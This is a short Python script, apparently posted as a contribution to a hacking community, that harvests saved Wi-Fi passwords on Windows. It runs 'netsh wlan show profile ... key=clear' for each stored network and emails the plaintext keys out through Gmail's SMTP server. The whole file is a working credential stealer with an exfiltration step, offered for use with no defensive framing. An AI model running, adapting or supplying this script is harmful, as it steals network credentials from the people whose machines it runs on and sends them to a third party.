#!/usr/bin/python
import subprocess
import smtplib
import re

def send_mail(email,password,message):
	server = smtplib.SMTP("smtp.gmail.com",587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email,email,message)
	server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
networks_names_list = re.findall("(?:Profile\s*:\s)(.*)",networks)

result= ""
for network_name in networks_names_list:
	command = "netsh wlan show profile " + network_name + " key=clear"
	current_result = subprocess.check_output(command, shell=True)
	result = result + current_result

send_mail("","",result)
#Remember to allow less secure apps!!!!
#Contribution to LulzSec Community by Pep
#This software is published under the GNU public license and the Berkeley Software Foundation
